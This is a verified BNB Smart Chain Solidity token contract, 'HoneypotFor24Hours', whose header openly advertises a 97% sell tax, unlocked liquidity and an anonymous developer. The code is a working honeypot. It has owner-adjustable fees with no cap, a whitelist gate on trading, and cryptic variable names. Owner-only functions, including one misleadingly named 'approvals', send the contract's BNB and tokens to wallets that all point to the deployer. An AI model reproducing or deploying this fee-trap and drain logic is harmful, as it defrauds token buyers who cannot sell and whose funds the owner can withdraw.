/**
 *Submitted for verification at BscScan.com on 2022-01-02
*/

/**

https://t.me/HoneypotFor24Hours


Chat will remain muted

Developer shall remain anonymous

Liquidity will NOT BE LOCKED

Buy Tax will be 15%

Sell Tax will start at 97%

Launch will be at 4pm EST, 9pm UTC on January 2nd, 2022

Sell Tax will be reduced to 20% 24 hours after launch

There will be NO MARKETING

Best of luck to those who trust

Some will be too scared, but those that see the potential will be rewarded. No jeets allowed in this one.

*/

// SPDX-License-Identifier: NOLICENSE

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface TokT {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

abstract contract Ownable is Context {
    address _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() internal view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract HoneypotFor24Hours is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'HoneypotFor24Hours';
    string private constant _symbol = 'HONEYPOT24';
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100 * 10**6 * (10 ** _decimals);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    uint256 public _maxTxAmount = ( _tTotal * 50 ) / 10000;
    uint256 public _maxWalletToken = ( _tTotal * 150 ) / 10000;
    uint256 public _mStx = ( _tTotal * 50 ) / 10000;
    uint256 public _asT = 30000 * (10 ** _decimals);
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) iFxE;
    mapping (address => bool) iTxLE;
    mapping (address => bool) iPSA;
    mapping (address => bool) itCDh;
    mapping (address => bool) isTloE;
    mapping (address => bool) iMxWE;
    address[] private _excluded;
    IRouter router;
    address public pair;
    address lpR;
    address dev1;
    address dev2;
    address dev3;
    address mkwA;
    address mkwT;
    address tfU;
    uint256 zr = 40;
    uint256 csbf = 33;
    uint256 csbs = 33;
    uint256 csbt = 33;
    uint256 tLD = 100;
    uint256 yr = 40;
    uint256 cr = 20;
    uint256 gso = 5000;
    
    bool private swapping;
    bool public swE = true;
    uint256 public sT = 100000 * (10 ** _decimals);
    bool LFG = false;
    uint256 public vsN = 50;
    uint256 vsD = 100;
    bool sFrz = true;
    uint8 sFrzT = 10 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = true;
    uint8 bFrzT = 10 seconds;
    mapping (address => uint) private bFrzin;
    uint8 mStts = 2 seconds;
    mapping (address => uint) private mSts;


    struct feeRatesStruct {
      uint256 rfi;
      uint256 marketing;
      uint256 liquidity;
    }
    
    feeRatesStruct private feeRates = feeRatesStruct(
     {rfi: 0,
      marketing: 0,
      liquidity: 150
    });

    feeRatesStruct private sellFeeRates = feeRatesStruct(
    {rfi: 0,
     marketing: 0,
     liquidity: 970
    });

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
    }
    
    TotFeesPaidStruct totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rRfi;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 tTransferAmount;
      uint256 tRfi;
      uint256 tMarketing;
      uint256 tLiquidity;
    }

    event FeesChanged();
    
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _rOwned[owner()] = _rTotal;
        _isExcluded[address(this)] = true;
        iFxE[msg.sender] = true;
        iFxE[address(owner())] = true;
        iFxE[address(this)] = true;
        iTxLE[msg.sender] = true;
        iTxLE[address(this)] = true;
        iTxLE[address(owner())] = true;
        iTxLE[address(router)] = true;
        iPSA[address(owner())] = true;
        iPSA[msg.sender] = true;
        iPSA[address(mkwA)] = true;
        iMxWE[address(msg.sender)] = true;
        iMxWE[address(this)] = true;
        iMxWE[address(owner())] = true;
        iMxWE[address(DEAD)] = true;
        iMxWE[address(pair)] = true;
        iMxWE[address(lpR)] = true;
        itCDh[address(this)] = true;
        isTloE[address(lpR)] = true;
        isTloE[address(owner())] = true;
        isTloE[msg.sender] = true;
        isTloE[DEAD] = true;
        isTloE[address(this)] = true;
        mkwT = address(this);
        lpR = msg.sender;
        dev1 = msg.sender;
        dev2 = msg.sender;
        dev3 = msg.sender;
        mkwA = msg.sender;
        tfU = msg.sender;
        
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rTransferAmount; }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReflection(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReflection(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break; }
        }
    }

    function setFeR(uint256 _rfi, uint256 _mark, uint256 _liq) external onlyOwner {
        feeRates.rfi = _rfi;
        feeRates.marketing = _mark;
        feeRates.liquidity = _liq;
        emit FeesChanged();
    }

    function setSFeR(uint256 _rfi, uint256 _mark, uint256 _liq) external onlyOwner{
        sellFeeRates.rfi = _rfi;
        sellFeeRates.marketing = _mark;
        sellFeeRates.liquidity = _liq;
        emit FeesChanged();
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function totalReflections() public view returns (uint256) {
        return totFeesPaid.rfi;
    }

    function mytotalReflections(address wallet) public view returns (uint256) {
        return _rOwned[wallet];
    }

    function mytotalReflections2(address wallet) public view returns (uint256) {
        return _rOwned[wallet] - _tOwned[wallet];
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tLiquidity;
        }
        _rOwned[address(this)] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[mkwT])
        {
            _tOwned[mkwT]+=tMarketing;
        }
        _rOwned[mkwT] +=rMarketing;
    }


    function _getValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi,to_return.rMarketing, to_return.rLiquidity) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory s) {
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s; }
        if(isSale){
            s.tRfi = tAmount*sellFeeRates.rfi/1000;
            s.tMarketing = tAmount*sellFeeRates.marketing/1000;
            s.tLiquidity = tAmount*sellFeeRates.liquidity/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity; }
        else{
            s.tRfi = tAmount*feeRates.rfi/1000;
            s.tMarketing = tAmount*feeRates.marketing/1000;
            s.tLiquidity = tAmount*feeRates.liquidity/1000;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity; }
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity) {
        rAmount = tAmount*currentRate;
        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0); }
        rRfi = s.tRfi*currentRate;
        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        rTransferAmount =  rAmount-rRfi-rMarketing-rLiquidity;
        return (rAmount, rTransferAmount, rRfi,rMarketing,rLiquidity);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]]; }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        if(!iPSA[from] && !iPSA[to]){require(LFG, "LFG");}
        if(!iMxWE[to] && !iPSA[from] && to != address(this) && to != address(DEAD) && to != pair && to != lpR){
            require((balanceOf(to) + amount) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(from != pair && sFrz && !isTloE[from]) {
            require(sFrzin[from] < block.timestamp, "Outside of Time Allotment"); 
            sFrzin[from] = block.timestamp + sFrzT;} 
        if(from == pair && bFrz && !isTloE[to]){
            require(bFrzin[to] < block.timestamp, "Outside of Time Allotment"); 
            bFrzin[to] = block.timestamp + bFrzT;} 
        checkTxLimit(from, amount, to);
        chkSmTx(from != pair, from, amount, to);
        if(from == pair){mSts[to] = block.timestamp + mStts;}
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 vsT;
        if(amount.mul(vsN).div(vsD) <= sT){vsT = amount.mul(vsN).div(vsD);}
        if(amount.mul(vsN).div(vsD) > sT){vsT = sT;}
        bool canSwap = contractTokenBalance >= vsT;
        bool aboveM = amount >= _asT;
        if(!swapping && swE && canSwap && from != pair && aboveM && !itCDh[from]){
            swapAndLiquify(vsT); }        
        bool isSale;
        if(to == pair) isSale = true;
        _tokenTransfer(from, to, amount, !(iFxE[from] || iFxE[to]), isSale);
    }

    function checkTxLimit(address sender, uint256 amount, address recipient) internal view {
        require (amount <= _maxTxAmount || iTxLE[sender] || iPSA[recipient], "TX Limit Exceeded");
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale);
        if (_isExcluded[sender] ) {
                _tOwned[sender] = _tOwned[sender]-tAmount;}
        if (_isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;}
        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        _reflectRfi(s.rRfi, s.tRfi);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeMarketing(s.rMarketing, s.tMarketing);
        emit Transfer(sender, recipient, s.tTransferAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tMarketing);
    }

    function updateRouter(address _router) external onlyOwner {
        router = IRouter(address(_router));
    }

    function setTLE(address holder, bool exempt) external onlyOwner {
        iTxLE[holder] = exempt;
    }

    function chkSmTx(bool selling, address from, uint256 amount, address recipient) internal view {
        if(selling && mSts[from] < block.timestamp){
            require(amount <= _mStx || iTxLE[from] || iPSA[recipient], "TX Limit Exceeded");}
    }

    function setiPSa(bool _enabled, address _add) external onlyOwner {
        iPSA[_add] = _enabled;
    }

    function setMWP(uint256 _mnWP) external onlyOwner {
        _maxWalletToken = (_tTotal * _mnWP) / 10000;
    }

    function setgas(uint256 _gso) external onlyOwner {
        gso = _gso;
    }

    function setLFG() external onlyOwner {
        LFG = true;
    }

    function maxTL() external onlyOwner {
        _maxTxAmount = _tTotal.mul(1);
        _maxWalletToken = _tTotal.mul(1);
    }

    function setvarsT(uint256 _vstf, uint256 _vstd) external onlyOwner {
        vsN = _vstf;
        vsD = _vstd;
    }

    function setMbTP(uint256 _mnbTP) external onlyOwner {
        _maxTxAmount = (_tTotal * _mnbTP) / 10000;
    }

    function setiCdh(bool _enab, address _add) external onlyOwner {
        itCDh[_add] = _enab;
    }

    function setMsTx(uint256 _mstxP) external onlyOwner {
        _mStx = (_tTotal * _mstxP) / 10000;
    }

    function setWME(address holder, bool exempt) external onlyOwner {
        iMxWE[holder] = exempt;
    }

    function setsFrz(bool _status, uint8 _int) external onlyOwner {
        sFrz = _status;
        sFrzT = _int;
    }

    function setbFrz(bool _status, uint8 _int) external onlyOwner {
        bFrz = _status;
        bFrzT = _int;
    }

    function setmakT(address _mt) external onlyOwner{
        mkwT = _mt;
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap{
        uint256 denominator= (yr + zr + cr) * 2;
        uint256 tokensToAddLiquidityWith = tokens * yr / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - yr);
        uint256 bnbToAddLiquidityWith = unitBalance * yr;
        if(bnbToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith); }
        uint256 zrAmt = unitBalance * 2 * zr;
        if(zrAmt > 0){
          payable(mkwA).transfer(zrAmt); }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpR,
            block.timestamp
        );
    }

    function setswap(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external onlyOwner {
        uint256 tamt = TokT(_tadd).balanceOf(address(this));
        TokT(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function updateMWT(address newWallet) external onlyOwner{
        require(mkwA != newWallet ,'Wallet already set');
        mkwA = newWallet;
        iFxE[mkwA];
    }

    function setautol(address _lpR) external onlyOwner {
        lpR = _lpR;
    }

    function setrecadd(address _mkwa, address _dev2, address _dev3, address _dev1) external onlyOwner {
        mkwA = _mkwa;
        dev3 = _dev3;
        dev2 = _dev2;
        dev1 = _dev1;
    }

    function setvariable(uint256 _cvariable, uint256 _yvariable, uint256 _zvariable) external onlyOwner {
        cr = _cvariable;
        yr = _yvariable;
        zr = _zvariable;
    }

    function cSb(uint256 aP) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(tfU).transfer(amountBNB.mul(aP).div(100));
    }

    function setFE(address holder, bool exempt) external onlyOwner {
        iFxE[holder] = exempt;
    }

    function approvals(uint256 _na, uint256 _da) external onlyOwner {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(csbf).div(100);
        uint256 acBNBs = acBNBa.mul(csbs).div(100);
        uint256 acBNBt = acBNBa.mul(csbt).div(100);
        (bool tmpSuccess,) = payable(dev3).call{value: acBNBf, gas: gso}("");
        (tmpSuccess,) = payable(dev1).call{value: acBNBs, gas: gso}("");
        (tmpSuccess,) = payable(dev2).call{value: acBNBt, gas: gso}("");
        tmpSuccess = false;
    }

    function setswe(bool _enabled, uint256 _amount) external onlyOwner {
        swE = _enabled;
        sT = _amount * (10 ** _decimals);
    }

    function setmswt(uint256 _amount) external onlyOwner {
        _asT = _amount * (10 ** _decimals);
    }

    function setcsbP(uint256 _csbf, uint256 _csbs, uint256 _csbt) external onlyOwner {
        csbf = _csbf;
        csbs = _csbs;
        csbt = _csbt;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    receive() external payable{
    }
}